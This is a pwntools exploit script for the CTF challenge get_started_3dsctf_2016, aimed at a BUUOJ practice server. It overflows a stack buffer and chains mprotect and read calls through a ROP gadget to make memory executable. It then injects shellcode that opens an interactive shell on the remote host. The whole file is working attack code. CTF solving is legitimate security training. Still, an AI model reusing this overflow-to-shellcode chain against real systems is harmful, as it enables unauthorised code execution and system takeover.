#!/usr/bin/python
#__author__:TaQini
#ref: https://blog.csdn.net/qq_37433000/article/details/102056006

from pwn import *

local_file  = './get_started_3dsctf_2016'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'
remote_host  = 'node3.buuoj.cn'
remote_port = 29183

DEBUG = False 
# DEBUG = True

if DEBUG:
	p = process(local_file)
	libc = ELF(local_libc)
else: 
	p = remote(remote_host,remote_port)
	libc = ELF(remote_libc)
elf = ELF(local_file)

context.log_level = 'debug'

# info
len = 56

# gadget
pop3_ret=0x0804951D

# rop1 enable stack execute
payload = 'a' * len
# int mprotect(void *addr, size_t len, int prot);
payload+= p32(elf.symbols['mprotect'])+p32(pop3_ret)+p32(0x080EB000)+p32(0x1000)+p32(0x7)
payload+= p32(elf.symbols['read'])+p32(pop3_ret)+p32(0)+p32(0x080EBF81)+p32(0x100)
payload+= p32(0x080EBF81)
p.sendline(payload)

# exec shellcode
shellcode = asm(shellcraft.sh())
p.sendline(shellcode)

log.warning('--------------------------------')

p.interactive()

